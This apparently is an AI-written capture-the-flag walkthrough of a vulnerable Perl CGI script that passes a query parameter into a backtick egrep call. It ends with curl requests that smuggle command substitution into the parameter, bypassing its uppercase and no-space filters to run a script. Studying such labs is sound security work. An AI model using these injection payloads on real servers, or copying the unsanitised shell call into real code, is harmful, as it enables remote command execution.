Certainly, here's the adjusted version:

"In this exercise, there is a Perl file in the home directory. The server is listening on localhost:4646 and capturing query parameters x and y.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

It then performs functions t and n:

```perl
sub t {
  $nn = $_[1];                              # assigning param y to "$nn"
  $xx = $_[0];                              # assigning param x to "$xx"
  $xx =~ tr/a-z/A-Z/;                       # tr/ operator translates the first list /a-z/ to the second list /A-Z/ (puts characters in uppercase)
  $xx =~ s/\s.*//;                          # s/ substitute operator replaces /\s.*/ by // (simply removing everything after the first space)
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  # backticks execute `egrep "^$xx" /tmp/xd 2>&1` where ^ means the first match
}
```

The solution found to meet all the requirements is to execute something that:
- Needs to be only in uppercase
- Needs to have no space
- Needs to be the first match

We can write a script with an uppercase name:

```bash
/tmp/SCRIPT
```

Give it as an argument and use the wildcard /* to test every directory from root:

```bash
curl 'http://127.0.0.1:4646?x=/*/SCRIPT'
```

Finally, we need to use command substitution to execute the command /tmp/SCRIPT:

```bash
curl 'http://127.0.0.1:4646?x=$(/*/SCRIPT)'
                    or
curl 'http://127.0.0.1:4646?x=`/*/SCRIPT`'
```
